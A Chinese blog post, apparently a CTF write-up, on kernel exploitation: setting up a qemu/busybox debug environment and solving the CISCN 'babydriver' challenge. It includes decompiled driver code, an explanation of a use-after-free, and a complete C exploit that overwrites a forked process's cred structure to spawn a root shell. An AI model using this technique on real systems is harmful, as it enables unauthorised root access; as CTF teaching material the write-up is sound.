<!DOCTYPE html>


  <html class="light page-post">


<head>
  <meta charset="utf-8">
  
  <title>Kernel_Pwn_ONE | V1NKe的心情垃圾桶</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="PWN," />
  

  <meta name="description" content="kernel_pwn">
<meta name="keywords" content="PWN">
<meta property="og:type" content="article">
<meta property="og:title" content="Kernel_Pwn_ONE">
<meta property="og:url" content="http://yoursite.com/2019/03/23/kernel_pwn1/index.html">
<meta property="og:site_name" content="V1NKe的心情垃圾桶">
<meta property="og:description" content="kernel_pwn">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/kernel_pwn1/4D67244C-5CCA-4746-9503-CB32A5D0E5C1.png">
<meta property="og:image" content="http://yoursite.com/kernel_pwn1/6D673E58-8B02-4DAB-97A4-1BA821B829BC.png">
<meta property="og:image" content="http://yoursite.com/kernel_pwn1/EA677783-AF64-43F6-84E7-66132201FD7F.png">
<meta property="og:image" content="http://yoursite.com/kernel_pwn1/DBD3EC21-0C10-4423-8105-0AE0DC5432CF.png">
<meta property="og:image" content="http://yoursite.com/kernel_pwn1/586CFD09-A9B6-4022-B3E4-35EFE1BCCBD6.png">
<meta property="og:image" content="http://yoursite.com/kernel_pwn1/2A18BFB9-60AB-4809-AE4D-CCEB078EE17B.png">
<meta property="og:updated_time" content="2019-03-26T03:22:33.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Kernel_Pwn_ONE">
<meta name="twitter:description" content="kernel_pwn">
<meta name="twitter:image" content="http://yoursite.com/kernel_pwn1/4D67244C-5CCA-4746-9503-CB32A5D0E5C1.png">

  

  
    <link rel="icon" href="/haimian.ico">
  

  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">


  
    <link rel="stylesheet" href="/css/personal-style.css">
  

  

  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


  
  <script type="text/javascript">
	(function(){
	    var bp = document.createElement('script');
	    var curProtocol = window.location.protocol.split(':')[0];
	    if (curProtocol === 'https') {
	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
	    }
	    else {
	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
	    }
	    var s = document.getElementsByTagName("script")[0];
	    s.parentNode.insertBefore(bp, s);
	})();
  </script>



  
    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
  
</head>

<body>


  
    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
  

  <div class="post-header CENTER">
   
  <div class="toolbox">
    <a class="toolbox-entry" href="/">
      <span class="toolbox-entry-text">盒子</span>
      <i class="icon-angle-down"></i>
      <i class="icon-home"></i>
    </a>
    <ul class="list-toolbox">
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/archives/"
            rel="noopener noreferrer"
            target="_self"
            >
            博客
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/tag/"
            rel="noopener noreferrer"
            target="_self"
            >
            标签
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/about/"
            rel="noopener noreferrer"
            target="_self"
            >
            关于
          </a>
        </li>
      
    </ul>
  </div>


</div>


  <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内核PWN环境搭建："><span class="toc-text">内核PWN环境搭建：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#编译内核："><span class="toc-text">编译内核：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-安装依赖："><span class="toc-text">1.安装依赖：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-解压后设置："><span class="toc-text">3. 解压后设置：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-内核生成："><span class="toc-text">4. 内核生成：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编译busybox："><span class="toc-text">编译busybox：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-下载："><span class="toc-text">1. 下载：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-解压后设置："><span class="toc-text">2. 解压后设置：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-编译："><span class="toc-text">3. 编译：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-打包、内核初始化："><span class="toc-text">4. 打包、内核初始化：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实战熟悉kernel-pwn流程："><span class="toc-text">实战熟悉kernel pwn流程：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#babyioctl："><span class="toc-text">babyioctl：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyopen："><span class="toc-text">babyopen：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyrelease："><span class="toc-text">babyrelease：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babywrite："><span class="toc-text">babywrite：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyread："><span class="toc-text">babyread：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#提权："><span class="toc-text">提权：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP：-1"><span class="toc-text">EXP：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#提权：-1"><span class="toc-text">提权：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接："><span class="toc-text">参考链接：</span></a></li></ol></li></ol>
  </div>



<div class="content content-post CENTER">
   <article id="post-kernel_pwn1" class="article article-type-post" itemprop="blogPost">
  <header class="article-header">
    <h1 class="post-title">Kernel_Pwn_ONE</h1>

    <div class="article-meta">
      <span>
        <i class="icon-calendar"></i>
        <span>2019.03.23</span>
      </span>

      
        <span class="article-author">
          <i class="icon-user"></i>
          <span>V1NKe</span>
        </span>
      

      


      

      
      <i class="fa fa-eye"></i> 
        <span id="busuanzi_container_page_pv">
           &nbsp热度 <span id="busuanzi_value_page_pv">
           <i class="fa fa-spinner fa-spin"></i></span>℃
        </span>
      
      
    </div>
  </header>

  <div class="article-content">
    
      <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>花了大概两周的时间学了一下kernel pwn的知识，感觉自己进度还是有点慢了，在这里总结复习一下。（加快进度:)</p>
<h2 id="内核PWN环境搭建："><a href="#内核PWN环境搭建：" class="headerlink" title="内核PWN环境搭建："></a>内核PWN环境搭建：</h2><p>这里建议用qemu+gdb环境来调试，并且建议使用Ubuntu14.04，所需要的东西有：</p>
<ul>
<li>qemu</li>
<li>busybox</li>
</ul>
<p>其中busybox的作用是构建一个简单的文件系统和命令，以此配合内核的启动。</p>
<h3 id="编译内核："><a href="#编译内核：" class="headerlink" title="编译内核："></a>编译内核：</h3><h4 id="1-安装依赖："><a href="#1-安装依赖：" class="headerlink" title="1.安装依赖："></a>1.安装依赖：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc qemu qemu-system</span><br></pre></td></tr></table></figure>
<p>####2. 下载源码：</p>
<blockquote>
<p><a href="https://mirrors.edge.kernel.org/pub/linux/kernel/" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/linux/kernel/</a></p>
</blockquote>
<h4 id="3-解压后设置："><a href="#3-解压后设置：" class="headerlink" title="3. 解压后设置："></a>3. 解压后设置：</h4><p>在源码目录：</p>
<blockquote>
<p>make menuconfig</p>
</blockquote>
<h4 id="4-内核生成："><a href="#4-内核生成：" class="headerlink" title="4. 内核生成："></a>4. 内核生成：</h4><blockquote>
<p>make bzImage</p>
</blockquote>
<p>生成的bzImage在/arch/x86/boot/下，vmlinux在源码根目录，前者为压缩内核，后者为静态编译，未经压缩的kernel。</p>
<h3 id="编译busybox："><a href="#编译busybox：" class="headerlink" title="编译busybox："></a>编译busybox：</h3><h4 id="1-下载："><a href="#1-下载：" class="headerlink" title="1. 下载："></a>1. 下载：</h4><blockquote>
<p><a href="https://busybox.net/downloads/busybox-1.30.0.tar.bz2" target="_blank" rel="noopener">https://busybox.net/downloads/busybox-1.30.0.tar.bz2</a></p>
</blockquote>
<h4 id="2-解压后设置："><a href="#2-解压后设置：" class="headerlink" title="2. 解压后设置："></a>2. 解压后设置：</h4><blockquote>
<p>make menuconfig</p>
</blockquote>
<p>进设置后，勾上Build static binary (no shared libs)</p>
<h4 id="3-编译："><a href="#3-编译：" class="headerlink" title="3. 编译："></a>3. 编译：</h4><blockquote>
<p>make install -j4</p>
</blockquote>
<h4 id="4-打包、内核初始化："><a href="#4-打包、内核初始化：" class="headerlink" title="4. 打包、内核初始化："></a>4. 打包、内核初始化：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd _install</span><br><span class="line">mkdir proc</span><br><span class="line">mkdir sys</span><br><span class="line">touch init</span><br><span class="line">chmod +x init</span><br><span class="line">touch packet</span><br></pre></td></tr></table></figure>
<p>init中内核初始化：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;&#123;==DBG==&#125; INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"># insmod /xxx.ko # load ko</span><br><span class="line">mdev -s # We need this to find /dev/sda later</span><br><span class="line">echo -e &quot;&#123;==DBG==&#125; Boot took $(cut -d&apos; &apos; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user</span><br><span class="line"># exec /bin/sh #root</span><br></pre></td></tr></table></figure>
<p>insmod为加载指定内核，如果加了-s则为调试选项。</p>
<p>packet中写入，文件打包：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;Generate rootfs.img&quot;</span><br><span class="line">find . | cpio -o --format=newc &gt; ./rootfs.img</span><br></pre></td></tr></table></figure>
<h2 id="实战熟悉kernel-pwn流程："><a href="#实战熟悉kernel-pwn流程：" class="headerlink" title="实战熟悉kernel pwn流程："></a>实战熟悉kernel pwn流程：</h2><p>用CISCN里的babydriver来练手，了解整个流程：</p>
<p>三个文件，rootfs.cpio代表前面所说的文件命令系统，也就是磁盘。需要解压，解压有特殊的解压方法，需要先用gunzip，但是gunzip认后缀不认文件格式，所以需要重命名下文件格式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir driver</span><br><span class="line">cd driver</span><br><span class="line">mv ../rootfs.cpio rootfs.cpio.gz</span><br><span class="line">gunzip ./rootfs.cpio.gz</span><br><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure>
<p>当更改了其中的文件的时候，需要重新打包一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; rootfs.cpio</span><br></pre></td></tr></table></figure>
<p>boot.sh文件是qemu的启动脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &apos;console=ttyS0 root=/dev/ram oops=panic panic=1&apos; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -gdb tcp::1234</span><br></pre></td></tr></table></figure>
<ul>
<li>-initrd 指定一个硬盘镜像文件</li>
<li>-kernel 指定内核镜像</li>
<li>-append 附加选项，指定no kaslr可以关闭随机偏移</li>
<li>-m 指定内存大小</li>
<li>-cpu 设置cpu安全选项，这里开启了smep保护</li>
<li>-smp 设置内核数和线程数</li>
<li>-s 和上面的-gdb tcp::1234相同，即-s是他的缩写，不需要重复写</li>
</ul>
<p>接下来进入解压出来的硬盘文件里看看，主要看init文件，该文件是内核启动时的设置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&apos; &apos; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>其中insmod就是所加载的驱动babydriver.ko，我们所要利用的就是这个文件。所以需要我们从上面所示的文件夹中把这个驱动提取出来。为了方便后续的调试我们需要将<code>setsid cttyhack setuidgid 1000 sh</code>改为值时0的root权限。</p>
<p>以上就是初期所需要做的所有工作。接下来开始按pwn的常规思路来解。</p>
<h4 id="babyioctl："><a href="#babyioctl：" class="headerlink" title="babyioctl："></a>babyioctl：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v3; // rdx</span><br><span class="line">  size_t v4; // rbx</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  if ( command == 0x10001 )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(&quot;alloc done\n&quot;);</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB);</span><br><span class="line">    result = -22LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该ioctl函数是驱动的核心函数，当参数为0x10001时，释放babydev结构体的缓冲区，并重新分配一个大小为第二参数值的空间。</p>
<h4 id="babyopen："><a href="#babyopen：" class="headerlink" title="babyopen："></a>babyopen：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall babyopen(inode *inode, file *filp)</span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 64LL);</span><br><span class="line">  babydev_struct.device_buf_len = 64LL;</span><br><span class="line">  printk(&quot;device open\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用open时创建一个64大小的缓存块，初始化了babydev结构体。</p>
<h4 id="babyrelease："><a href="#babyrelease：" class="headerlink" title="babyrelease："></a>babyrelease：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall babyrelease(inode *inode, file *filp)</span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(&quot;device release\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关闭时释放babydev的缓冲区。</p>
<h4 id="babywrite："><a href="#babywrite：" class="headerlink" title="babywrite："></a>babywrite：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v4; // rdx</span><br><span class="line">  ssize_t result; // rax</span><br><span class="line">  ssize_t v6; // rbx</span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  if ( !babydev_struct.device_buf )</span><br><span class="line">    return -1LL;</span><br><span class="line">  result = -2LL;</span><br><span class="line">  if ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>write函数先判断写入个数的值是否大于babydev的最大长度，否则成功写入。</p>
<h4 id="babyread："><a href="#babyread：" class="headerlink" title="babyread："></a>babyread：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v4; // rdx</span><br><span class="line">  ssize_t result; // rax</span><br><span class="line">  ssize_t v6; // rbx</span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  if ( !babydev_struct.device_buf )</span><br><span class="line">    return -1LL;</span><br><span class="line">  result = -2LL;</span><br><span class="line">  if ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也是babywrite一样的正常检查。</p>
<p>这里如果按正常思路来想是很难发现有漏洞的，关键就出在结构体容量就一个，所以如果后续又open了一个驱动，那么后来的驱动就会覆盖掉前者的驱动。如果free掉前者，那么后者就成了一个悬挂指针，产生UAF漏洞。</p>
<p>如何利用这个UAF，那么必须得知道cred这个结构体，可以通过cred来提权。</p>
<p>cred结构体：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">struct cred &#123;</span><br><span class="line">    atomic_t    usage;</span><br><span class="line">#ifdef CONFIG_DEBUG_CREDENTIALS</span><br><span class="line">    atomic_t    subscribers;    /* number of processes subscribed */</span><br><span class="line">    void        *put_addr;</span><br><span class="line">    unsigned    magic;</span><br><span class="line">#define CRED_MAGIC  0x43736564</span><br><span class="line">#define CRED_MAGIC_DEAD 0x44656144</span><br><span class="line">#endif</span><br><span class="line">    kuid_t      uid;        /* real UID of the task */</span><br><span class="line">    kgid_t      gid;        /* real GID of the task */</span><br><span class="line">    kuid_t      suid;       /* saved UID of the task */</span><br><span class="line">    kgid_t      sgid;       /* saved GID of the task */</span><br><span class="line">    kuid_t      euid;       /* effective UID of the task */</span><br><span class="line">    kgid_t      egid;       /* effective GID of the task */</span><br><span class="line">    kuid_t      fsuid;      /* UID for VFS ops */</span><br><span class="line">    kgid_t      fsgid;      /* GID for VFS ops */</span><br><span class="line">    unsigned    securebits; /* SUID-less security management */</span><br><span class="line">    kernel_cap_t    cap_inheritable; /* caps our children can inherit */</span><br><span class="line">    kernel_cap_t    cap_permitted;  /* caps we&apos;re permitted */</span><br><span class="line">    kernel_cap_t    cap_effective;  /* caps we can actually use */</span><br><span class="line">    kernel_cap_t    cap_bset;   /* capability bounding set */</span><br><span class="line">    kernel_cap_t    cap_ambient;    /* Ambient capability set */</span><br><span class="line">#ifdef CONFIG_KEYS</span><br><span class="line">    unsigned char   jit_keyring;    /* default keyring to attach requested</span><br><span class="line">                     * keys to */</span><br><span class="line">    struct key __rcu *session_keyring; /* keyring inherited over fork */</span><br><span class="line">    struct key  *process_keyring; /* keyring private to this process */</span><br><span class="line">    struct key  *thread_keyring; /* keyring private to this thread */</span><br><span class="line">    struct key  *request_key_auth; /* assumed request_key authority */</span><br><span class="line">#endif</span><br><span class="line">#ifdef CONFIG_SECURITY</span><br><span class="line">    void        *security;  /* subjective LSM security */</span><br><span class="line">#endif</span><br><span class="line">    struct user_struct *user;   /* real user ID subscription */</span><br><span class="line">    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */</span><br><span class="line">    struct group_info *group_info;  /* supplementary groups for euid/fsgid */</span><br><span class="line">    struct rcu_head rcu;        /* RCU deletion hook */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>该结构体记录了进程的权限，每一个进程中都有一个cred结构体，如果修改了这个cred结构体那么也就修改了权限。得知cred结构体大小可以自己计算，或者直接调试利用sizeof查看大小，每个内核版本的cred大小都不同。</p>
<p>那么如何修改该结构体，当然用write函数，因为该处有UAF漏洞，那么让cred结构体出现在UAF处即可用write直接修改cred。该怎么让cred出现在此处，答案是新建一个cred，那么就可以用fork函数产生一个新进程，新进程就会创建一个新的cred了，所以我们就有如下的思路：</p>
<ol>
<li>open一个驱动</li>
<li>再open一个驱动，覆盖第一个</li>
<li>free第一个驱动，malloc一个大小为cred大小的空间，产生UAF</li>
<li>fork一个新进程，让新进程的cred恰好在上面所malloc的空间中</li>
<li>利用babywrite向第二个驱动写，相当于修改cred结构体，提权</li>
</ol>
<p>这里主要提一下调试的时候的注意点：</p>
<p>gdb起：</p>
<blockquote>
<p>gdb ./vmlinux -q</p>
</blockquote>
<p>这里如果没有vmlinux文件，可以利用<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener">extract-vmlinux</a>提取：</p>
<blockquote>
<p>./extract-vmlinux ./bzImage &gt; vmlinux</p>
</blockquote>
<p>这里还需要导入驱动文件的符号表：</p>
<blockquote>
<p>add-symbol-file ./***.ko 0xFFFFFFFFFFFFFF</p>
</blockquote>
<p>后面的地址为.text段的地址，可以直接从qemu中查看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/ # cat proc/modules </span><br><span class="line">babydriver 16384 0 - Live 0xffffffffc0000000 (OE)</span><br><span class="line">或</span><br><span class="line">/ # cat sys/module/babydriver/sections/.text </span><br><span class="line">0xffffffffc0000000</span><br></pre></td></tr></table></figure>
<p>查看都需要root权限，所以之前要求调试的时候将权限改为root。</p>
<p>之后的断点就可以直接用符号下断。</p>
<h4 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stropts.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int fd1 = open(&quot;/dev/babydev&quot;,2);</span><br><span class="line">    int fd2 = open(&quot;/dev/babydev&quot;,2);</span><br><span class="line">    </span><br><span class="line">    int a = ioctl(fd1,0x10001,0xa8);</span><br><span class="line">    </span><br><span class="line">    close(fd1);</span><br><span class="line">    int pid = fork();                 //创建新进程</span><br><span class="line">    if(pid &lt; 0)&#123;</span><br><span class="line">        printf(&quot;error!&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    else if(pid == 0)&#123;</span><br><span class="line">        char b[30] = &#123;0&#125;;</span><br><span class="line">        write(fd2,b,30);              //修改cred的uid为root</span><br><span class="line">        if(getuid() == 0)&#123;</span><br><span class="line">             system(&quot;/bin/sh&quot;);</span><br><span class="line">             exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        wait(NULL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="提权："><a href="#提权：" class="headerlink" title="提权："></a>提权：</h4><p><img src="/kernel_pwn1/4D67244C-5CCA-4746-9503-CB32A5D0E5C1.png" alt="4D67244C-5CCA-4746-9503-CB32A5D0E5C1"></p>
<p>###第二种解法（bypass smep）：</p>
